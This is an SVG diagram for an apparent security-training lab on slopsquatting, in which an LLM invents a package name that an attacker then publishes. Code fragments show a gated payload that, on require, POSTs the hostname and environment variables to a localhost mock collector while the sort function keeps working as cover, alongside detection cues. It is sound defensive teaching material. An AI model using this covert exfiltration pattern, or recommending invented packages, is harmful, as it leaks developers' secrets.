@@ -1,0 +1,259 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1520" height="2224" viewBox="0 0 1520 2224" role="img" aria-label="Scenario 24 detailed code-level Slopsquatting workflow">
+<style>
+  .box { stroke-width: 2; stroke-linejoin: round; }
+  .title { font-family: 'Segoe UI', system-ui, sans-serif; font-weight: 700; fill: #0f172a; }
+  .caption { font-family: 'Segoe UI', system-ui, sans-serif; fill: #64748b; }
+  .panel-title { font-family: 'Segoe UI', system-ui, sans-serif; fill: #0f172a; font-size: 15px; font-weight: 700; }
+  text { font-family: 'Segoe UI', system-ui, sans-serif; }
+  .arrow { fill: none; stroke-linecap: round; stroke-linejoin: round; }
+  .edge-pill { stroke-width: 1.5; }
+  .edge-pill-text { font-family: 'Segoe UI', system-ui, sans-serif; }
+</style>
+<defs>
+  <marker id="arrowhead" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="9" refX="10" refY="4.5" orient="auto">
+    <polygon points="0 0, 12 4.5, 0 9" fill="#334155"/>
+  </marker>
+  <marker id="arrowhead-mal" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="9" refX="10" refY="4.5" orient="auto">
+    <polygon points="0 0, 12 4.5, 0 9" fill="#dc2626"/>
+  </marker>
+  <marker id="arrowhead-mock" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="9" refX="10" refY="4.5" orient="auto">
+    <polygon points="0 0, 12 4.5, 0 9" fill="#16a34a"/>
+  </marker>
+  <marker id="arrowhead-floci" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="9" refX="10" refY="4.5" orient="auto">
+    <polygon points="0 0, 12 4.5, 0 9" fill="#4338ca"/>
+  </marker>
+  <marker id="arrowhead-gate" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="9" refX="10" refY="4.5" orient="auto">
+    <polygon points="0 0, 12 4.5, 0 9" fill="#d97706"/>
+  </marker>
+  <filter id="soft" x="-5%" y="-5%" width="110%" height="110%">
+    <feDropShadow dx="0" dy="1" stdDeviation="1.2" flood-opacity="0.08"/>
+  </filter>
+</defs>
+
+<rect width="1520" height="2224" fill="#ffffff"/>
+<text class="title" x="28" y="32" font-size="22">Scenario 24 — code-level Slopsquatting workflow (detailed)</text>
+<text class="caption" x="28" y="54" font-size="13">LLM-hallucinated package name installed and beaconing on require - metadata, payload path, TESTBENCH gate, mock endpoint, and cover traffic</text>
+
+<rect class="box" x="28" y="72" width="1464" height="40" rx="8" fill="#fffbeb" stroke="#d97706" filter="url(#soft)"/>
+<text x="44" y="97" text-anchor="start" font-size="12" font-weight="600" fill="#0f172a">Trigger: require/import (NOT postinstall)  -  Gate: TESTBENCH_MODE === 'enabled'  -  Exfil: POST 127.0.0.1:3024/collect  -  Evidence: infrastructure/captured-data.json  -  Cover: array-sortify still returns sorted data</text>
+
+<!-- ========== PANEL A ========== -->
+<rect class="box" x="28" y="132" width="1464" height="360" rx="12" fill="#f8fafc" stroke="#cbd5e1" filter="url(#soft)"/>
+<text class="panel-title" x="44" y="158">Panel A — Identity / deception: LLM hallucinated name (what manifests expose)</text>
+
+<rect class="box" x="80" y="178" width="500" height="52" rx="8" fill="#dbeafe" stroke="#2563eb" filter="url(#soft)"/>
+<text x="96" y="196" font-size="13" font-weight="500" fill="#0f172a">Intended (review-only)</text>
+<text x="96" y="214" font-size="13" font-weight="500" fill="#0f172a">npm registry search for array-sortify</text>
+<rect class="box" x="820" y="178" width="600" height="52" rx="8" fill="#fee2e2" stroke="#dc2626" filter="url(#soft)"/>
+<text x="836" y="196" font-size="13" font-weight="500" fill="#0f172a">Installed (victim uses)</text>
+<text x="836" y="214" font-size="13" font-weight="500" fill="#0f172a">malicious-packages/array-sortify</text>
+
+<path class="arrow" d="M580 204 L820 204" stroke="#dc2626" stroke-width="2.75" stroke-dasharray="7 5" marker-end="url(#arrowhead-mal)"/>
+<rect class="edge-pill" x="605" y="192.5" width="190" height="23" rx="999" fill="#ffffff" stroke="#dc2626"/>
+<text class="edge-pill-text" x="700" y="205" text-anchor="middle" dominant-baseline="middle" font-size="13" font-weight="700" fill="#dc2626">LLM hallucinated name</text>
+
+<text x="80" y="258" text-anchor="start" font-size="12" font-weight="600" fill="#64748b">Field</text>
+<text x="260" y="258" text-anchor="start" font-size="12" font-weight="600" fill="#2563eb">npm registry search for array-sortify</text>
+<text x="820" y="258" text-anchor="start" font-size="12" font-weight="600" fill="#dc2626">malicious-packages/array-sortify</text>
+<path d="M80 268 H1440" stroke="#e2e8f0" stroke-width="2" fill="none"/>
+
+
+
+<rect class="box" x="80" y="400" width="1340" height="78" rx="8" fill="#fef2f2" stroke="#dc2626" filter="url(#soft)"/>
+<text x="96" y="418" text-anchor="start" font-size="11" font-weight="600" fill="#dc2626">victim-app/package.json</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="438" font-size="12" font-weight="600" fill="#dc2626">dependencies: {</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="453" font-size="12" font-weight="600" fill="#dc2626">  &quot;array-sortify&quot;: &quot;^1.0.0&quot;</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="468" font-size="12" font-weight="600" fill="#dc2626">}</text>
+
+<!-- ========== PANEL B ========== -->
+<rect class="box" x="28" y="516" width="1464" height="300" rx="12" fill="#f8fafc" stroke="#cbd5e1" filter="url(#soft)"/>
+<text class="panel-title" x="44" y="542">Panel B — Code surfaces side-by-side (malicious sort helper on require; not a thin step list)</text>
+
+<rect class="box" x="80" y="562" width="560" height="228" rx="8" fill="#eff6ff" stroke="#2563eb" filter="url(#soft)"/>
+<text x="96" y="586" text-anchor="start" font-size="13" font-weight="600" fill="#2563eb">none (name does not exist)</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="612" font-size="12" font-weight="500" fill="#0f172a">No legitimate package registered</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="628" font-size="12" font-weight="500" fill="#0f172a">LLM invented the name</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="644" font-size="12" font-weight="500" fill="#0f172a">Developer copied install command</text>
+
+<path class="arrow" d="M640 676 L780 676" stroke="#64748b" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="580.5" y="665" width="259" height="22" rx="999" fill="#ffffff" stroke="#64748b"/>
+<text class="edge-pill-text" x="710" y="677" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#64748b">malicious sort helper on require</text>
+
+<rect class="box" x="780" y="562" width="640" height="228" rx="8" fill="#fef2f2" stroke="#dc2626" filter="url(#soft)"/>
+<text x="796" y="586" text-anchor="start" font-size="13" font-weight="600" fill="#dc2626">malicious-packages/array-sortify/index.js</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="796" y="612" font-size="12" font-weight="500" fill="#0f172a">if (TESTBENCH_MODE !== 'enabled') return;</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="796" y="628" font-size="12" font-weight="500" fill="#0f172a">http.request({ hostname: '127.0.0.1', port: 3024, path: '/collect' });</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="796" y="644" font-size="12" font-weight="500" fill="#0f172a">Body: hostname + env vars + package metadata</text>
+
+<!-- ========== PANEL C ========== -->
+<rect class="box" x="28" y="840" width="1464" height="220" rx="12" fill="#f8fafc" stroke="#cbd5e1" filter="url(#soft)"/>
+<text class="panel-title" x="44" y="866">Panel C — setup.sh (one-time prep) then two terminals (lab run)</text>
+
+<rect class="box" x="80" y="890" width="360" height="140" rx="8" fill="#f1f5f9" stroke="#475569" filter="url(#soft)"/>
+<text x="96" y="912" text-anchor="start" font-size="13" font-weight="600" fill="#475569">1) ./setup.sh</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="936" font-size="11" font-weight="500" fill="#0f172a">source enable-testbench.sh</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="951" font-size="11" font-weight="500" fill="#0f172a">  -&gt; TESTBENCH_MODE=enabled</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="966" font-size="11" font-weight="500" fill="#0f172a">cd victim-app</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="981" font-size="11" font-weight="500" fill="#0f172a">npm install --ignore-scripts</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="996" font-size="11" font-weight="500" fill="#0f172a">npm start</text>
+
+<path class="arrow" d="M440 960 L520 960" stroke="#334155" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="435.5" y="949.5" width="89" height="21" rx="999" fill="#ffffff" stroke="#334155"/>
+<text class="edge-pill-text" x="480" y="961" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#334155">then start</text>
+
+<rect class="box" x="520" y="890" width="380" height="140" rx="8" fill="#f0fdf4" stroke="#16a34a" filter="url(#soft)"/>
+<text x="536" y="912" text-anchor="start" font-size="13" font-weight="600" fill="#16a34a">2) Terminal A — mock collector</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="536" y="936" font-size="11" font-weight="500" fill="#0f172a">node infrastructure/mock-server.js</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="536" y="951" font-size="11" font-weight="500" fill="#0f172a">listen http://localhost:3024</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="536" y="966" font-size="11" font-weight="500" fill="#0f172a">init captured-data.json {captures:[]}</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="536" y="981" font-size="11" font-weight="500" fill="#0f172a">POST /collect - GET /captured-data</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="536" y="996" font-size="11" font-weight="500" fill="#0f172a">DELETE /captured-data</text>
+
+<path class="arrow" d="M900 960 L980 960" stroke="#334155" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="892" y="949.5" width="96" height="21" rx="999" fill="#ffffff" stroke="#334155"/>
+<text class="edge-pill-text" x="940" y="961" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#334155">in parallel</text>
+
+<rect class="box" x="980" y="890" width="440" height="140" rx="8" fill="#fff7ed" stroke="#ea580c" filter="url(#soft)"/>
+<text x="996" y="912" text-anchor="start" font-size="13" font-weight="600" fill="#ea580c">3) Terminal B — lab run</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="996" y="936" font-size="11" font-weight="500" fill="#0f172a">cd victim-app</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="996" y="951" font-size="11" font-weight="500" fill="#0f172a">npm install array-sortify</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="996" y="966" font-size="11" font-weight="500" fill="#0f172a">npm start</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="996" y="981" font-size="11" font-weight="500" fill="#0f172a">require(&quot;array-sortify&quot;) runs payload</text>
+
+<rect class="box" x="80" y="1036" width="1340" height="18" rx="6" fill="#fffbeb" stroke="#d97706" filter="url(#soft)"/>
+<text x="96" y="1049" text-anchor="start" font-size="10" font-weight="600" fill="#d97706">Attack steps (compact): 1:Learner→Victim · 2:Learner→Victim · 3:Victim→MalPkg · 4:MalPkg→Mock</text>
+
+<!-- ========== PANEL D ========== -->
+<rect class="box" x="28" y="1084" width="1464" height="720" rx="12" fill="#f8fafc" stroke="#cbd5e1" filter="url(#soft)"/>
+<text class="panel-title" x="44" y="1110">Panel D — Runtime control flow + 127.0.0.1:3024/collect (TESTBENCH_MODE gate)</text>
+
+<rect class="box" x="80" y="1140" width="170" height="64" rx="8" fill="#ffedd5" stroke="#ea580c" filter="url(#soft)"/>
+<text x="92" y="1162" font-size="12" font-weight="500" fill="#0f172a">victim-app/index.js</text>
+<text x="92" y="1180" font-size="12" font-weight="500" fill="#0f172a">require(array-sortify)</text>
+
+<path class="arrow" d="M250 1172 L330 1172" stroke="#dc2626" stroke-width="2.75" marker-end="url(#arrowhead-mal)"/>
+<rect class="edge-pill" x="261" y="1161" width="58" height="22" rx="999" fill="#ffffff" stroke="#dc2626"/>
+<text class="edge-pill-text" x="290" y="1173" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#dc2626">loads</text>
+
+<rect class="box" x="330" y="1140" width="190" height="64" rx="8" fill="#fee2e2" stroke="#dc2626" filter="url(#soft)"/>
+<text x="342" y="1162" font-size="12" font-weight="500" fill="#0f172a">array-sortify/index.js</text>
+<text x="342" y="1180" font-size="12" font-weight="500" fill="#0f172a">http.request</text>
+
+<path class="arrow" d="M520 1172 L600 1172" stroke="#d97706" stroke-width="2.75" marker-end="url(#arrowhead-gate)"/>
+<rect class="edge-pill" x="531" y="1161" width="58" height="22" rx="999" fill="#ffffff" stroke="#d97706"/>
+<text class="edge-pill-text" x="560" y="1173" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#d97706">calls</text>
+
+<rect class="box" x="600" y="1140" width="250" height="64" rx="8" fill="#fef3c7" stroke="#d97706" filter="url(#soft)"/>
+<text x="612" y="1158" font-size="12" font-weight="500" fill="#0f172a">TESTBENCH_MODE === 'enabled'?</text>
+<text x="612" y="1176" font-size="12" font-weight="500" fill="#0f172a">runtime safety gate</text>
+
+<rect class="box" x="980" y="1128" width="200" height="56" rx="8" fill="#e2e8f0" stroke="#475569" filter="url(#soft)"/>
+<text x="992" y="1148" font-size="12" font-weight="500" fill="#0f172a">NO → [SAFE MODE]</text>
+<text x="992" y="1164" font-size="12" font-weight="500" fill="#0f172a">skip network; return</text>
+<path class="arrow" d="M850 1156 L980 1156" stroke="#475569" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="897.5" y="1145" width="35" height="22" rx="999" fill="#ffffff" stroke="#475569"/>
+<text class="edge-pill-text" x="915" y="1157" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#475569">no</text>
+
+<rect class="box" x="980" y="1212" width="200" height="56" rx="8" fill="#dbeafe" stroke="#2563eb" filter="url(#soft)"/>
+<text x="992" y="1232" font-size="12" font-weight="500" fill="#0f172a">YES → continue</text>
+<text x="992" y="1248" font-size="12" font-weight="500" fill="#0f172a">build + send payload</text>
+<path class="arrow" d="M850 1188 L980 1232" stroke="#2563eb" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="898.5" y="1209" width="43" height="22" rx="999" fill="#ffffff" stroke="#2563eb"/>
+<text class="edge-pill-text" x="920" y="1221" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#2563eb">yes</text>
+
+<rect class="box" x="80" y="1252" width="560" height="240" rx="8" fill="#1e293b" stroke="#0f172a" filter="url(#soft)"/>
+<text x="96" y="1276" text-anchor="start" font-size="13" font-weight="600" fill="#e2e8f0">HTTP request built on module load</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1300" font-size="11" font-weight="500" fill="#e2e8f0">http.request({</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1315" font-size="11" font-weight="500" fill="#e2e8f0">  hostname: '127.0.0.1',</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1330" font-size="11" font-weight="500" fill="#e2e8f0">  port: 3024,</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1345" font-size="11" font-weight="500" fill="#e2e8f0">  path: '/collect',</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1360" font-size="11" font-weight="500" fill="#e2e8f0">  method: 'POST'</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1375" font-size="11" font-weight="500" fill="#e2e8f0">})</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1390" font-size="11" font-weight="500" fill="#e2e8f0"></text>
+
+<path class="arrow" d="M980 1240 L640 1312" stroke="#2563eb" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="761.5" y="1249" width="117" height="22" rx="999" fill="#ffffff" stroke="#2563eb"/>
+<text class="edge-pill-text" x="820" y="1261" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#2563eb">build payload</text>
+
+<rect class="box" x="900" y="1332" width="520" height="88" rx="8" fill="#f0fdf4" stroke="#16a34a" filter="url(#soft)"/>
+<text x="916" y="1354" text-anchor="start" font-size="13" font-weight="600" fill="#16a34a">mock-server :3024 on POST /collect</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="916" y="1376" font-size="11" font-weight="500" fill="#0f172a">parse JSON -&gt; log CAPTURED DATA</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="916" y="1391" font-size="11" font-weight="500" fill="#0f172a">append captures[] -&gt; write captured-data.json -&gt; 200</text>
+
+<path class="arrow" d="M640 1376 L900 1376" stroke="#16a34a" stroke-width="2.75" marker-end="url(#arrowhead-mock)"/>
+<rect class="edge-pill" x="711.5" y="1365" width="117" height="22" rx="999" fill="#ffffff" stroke="#16a34a"/>
+<text class="edge-pill-text" x="770" y="1377" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#16a34a">POST /collect</text>
+
+<rect class="box" x="900" y="1452" width="240" height="96" rx="8" fill="#eef2ff" stroke="#4338ca" filter="url(#soft)"/>
+<text x="916" y="1474" text-anchor="start" font-size="12" font-weight="600" fill="#4338ca">Optional Floci</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="916" y="1496" font-size="11" font-weight="500" fill="#0f172a">SCAS_FLOCI_ENABLED=1</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="916" y="1511" font-size="11" font-weight="500" fill="#0f172a">uploadJson('24','slopsquat-exfil')</text>
+
+<rect class="box" x="1180" y="1452" width="240" height="96" rx="8" fill="#f1f5f9" stroke="#475569" filter="url(#soft)"/>
+<text x="1196" y="1474" text-anchor="start" font-size="12" font-weight="600" fill="#64748b">Capture hint</text>
+<text x="1196" y="1496" font-size="11" font-weight="500" fill="#0f172a">infrastructure/captured-data.json</text>
+<text x="1196" y="1511" font-size="11" font-weight="500" fill="#0f172a">127.0.0.1:3024/collect</text>
+
+<path class="arrow" d="M640 1500 L900 1500" stroke="#4338ca" stroke-width="2.75" stroke-dasharray="7 5" marker-end="url(#arrowhead-floci)"/>
+<rect class="edge-pill" x="698.5" y="1489.5" width="143" height="21" rx="999" fill="#ffffff" stroke="#4338ca"/>
+<text class="edge-pill-text" x="770" y="1501" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#4338ca">SCAS_FLOCI_ENABLED</text>
+
+<rect class="box" x="80" y="1592" width="560" height="100" rx="8" fill="#eff6ff" stroke="#2563eb" filter="url(#soft)"/>
+<text x="96" y="1616" text-anchor="start" font-size="13" font-weight="600" fill="#2563eb">After beacon: sort helper still works</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1640" font-size="11" font-weight="500" fill="#0f172a">exports.sortArray returns sorted data</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1655" font-size="11" font-weight="500" fill="#0f172a">Application output looks normal</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1670" font-size="11" font-weight="500" fill="#0f172a">No visible error to developer</text>
+
+<path class="arrow" d="M360 1492 L360 1592" stroke="#2563eb" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="335" y="1531" width="50" height="22" rx="999" fill="#ffffff" stroke="#2563eb"/>
+<text class="edge-pill-text" x="360" y="1543" text-anchor="middle" dominant-baseline="middle" font-size="12" font-weight="700" fill="#2563eb">then</text>
+
+<rect class="box" x="900" y="1592" width="520" height="100" rx="8" fill="#fff7ed" stroke="#ea580c" filter="url(#soft)"/>
+<text x="916" y="1616" text-anchor="start" font-size="13" font-weight="600" fill="#ea580c">What is visible vs invisible</text>
+<text x="916" y="1640" font-size="11" font-weight="500" fill="#0f172a">VISIBLE: npm install + npm start output</text>
+<text x="916" y="1655" font-size="11" font-weight="500" fill="#0f172a">HIDDEN: 127.0.0.1:3024 beacon on require</text>
+<text x="916" y="1670" font-size="11" font-weight="500" fill="#0f172a">HINT: curl localhost:3024/captured-data</text>
+
+<path class="arrow" d="M640 1642 L900 1642" stroke="#ea580c" stroke-width="2.75" marker-end="url(#arrowhead)"/>
+<rect class="edge-pill" x="715.5" y="1631.5" width="109" height="21" rx="999" fill="#ffffff" stroke="#ea580c"/>
+<text class="edge-pill-text" x="770" y="1643" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#ea580c">cover traffic</text>
+
+<!-- ========== PANEL E ========== -->
+<rect class="box" x="28" y="1832" width="1464" height="300" rx="12" fill="#f8fafc" stroke="#cbd5e1" filter="url(#soft)"/>
+<text class="panel-title" x="44" y="1858">Panel E — Verify + detection cues (from the same code paths)</text>
+
+<rect class="box" x="80" y="1882" width="400" height="210" rx="8" fill="#f0fdf4" stroke="#16a34a" filter="url(#soft)"/>
+<text x="96" y="1906" text-anchor="start" font-size="13" font-weight="600" fill="#16a34a">Verify evidence</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1932" font-size="11" font-weight="500" fill="#0f172a">curl -s http://localhost:3024/captured-data</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1948" font-size="11" font-weight="500" fill="#0f172a">-&gt; { &quot;captures&quot;: [ { timestamp, data } ] }</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1964" font-size="11" font-weight="500" fill="#0f172a"></text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1980" font-size="11" font-weight="500" fill="#0f172a">or read:</text>
+<text font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" x="96" y="1996" font-size="11" font-weight="500" fill="#0f172a">  infrastructure/captured-data.json</text>
+
+<rect class="box" x="560" y="1882" width="420" height="210" rx="8" fill="#fef2f2" stroke="#dc2626" filter="url(#soft)"/>
+<text x="576" y="1906" text-anchor="start" font-size="13" font-weight="600" fill="#dc2626">Code-review red flags</text>
+<text x="576" y="1932" font-size="11" font-weight="500" fill="#0f172a">1. Package name invented by LLM</text>
+<text x="576" y="1948" font-size="11" font-weight="500" fill="#0f172a">2. No registry verification</text>
+<text x="576" y="1964" font-size="11" font-weight="500" fill="#0f172a">3. Host 127.0.0.1:3024</text>
+<text x="576" y="1980" font-size="11" font-weight="500" fill="#0f172a">4. Exfil on require</text>
+<text x="576" y="1996" font-size="11" font-weight="500" fill="#0f172a">5. Copy-paste install command</text>
+
+<rect class="box" x="1060" y="1882" width="360" height="210" rx="8" fill="#fffbeb" stroke="#d97706" filter="url(#soft)"/>
+<text x="1076" y="1906" text-anchor="start" font-size="13" font-weight="600" fill="#d97706">Safety contract (do not weaken)</text>
+<text x="1076" y="1932" font-size="11" font-weight="500" fill="#0f172a">TESTBENCH_MODE must be enabled</text>
+<text x="1076" y="1948" font-size="11" font-weight="500" fill="#0f172a">  else [SAFE MODE] and stop</text>
+<text x="1076" y="1964" font-size="11" font-weight="500" fill="#0f172a">Exfil hostname is 127.0.0.1 only</text>
+<text x="1076" y="1980" font-size="11" font-weight="500" fill="#0f172a">Educational labels in package metadata</text>
+<text x="1076" y="1996" font-size="11" font-weight="500" fill="#0f172a">setup.sh -&gt; enable-testbench.sh</text>
+
+<path class="arrow" d="M480 1987 L560 1987" stroke="#16a34a" stroke-width="2.75" marker-end="url(#arrowhead-mock)"/>
+<rect class="edge-pill" x="492.5" y="1976.5" width="55" height="21" rx="999" fill="#ffffff" stroke="#16a34a"/>
+<text class="edge-pill-text" x="520" y="1988" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#16a34a">check</text>
+<path class="arrow" d="M980 1987 L1060 1987" stroke="#d97706" stroke-width="2.75" marker-end="url(#arrowhead-gate)"/>
+<rect class="edge-pill" x="996" y="1976.5" width="48" height="21" rx="999" fill="#ffffff" stroke="#d97706"/>
+<text class="edge-pill-text" x="1020" y="1988" text-anchor="middle" dominant-baseline="middle" font-size="11" font-weight="700" fill="#d97706">also</text>
+
+<text class="caption" x="28" y="2190" font-size="12">Sources of truth: scenarios/24-slopsquatting · localhost · TESTBENCH_MODE · [SAFE MODE] · SCAS_FLOCI_ENABLED · setup.sh · curl /collect · Regenerate: node scripts/diagrams/generate-scenario-codeflow-diagrams.js</text>
+</svg>
+
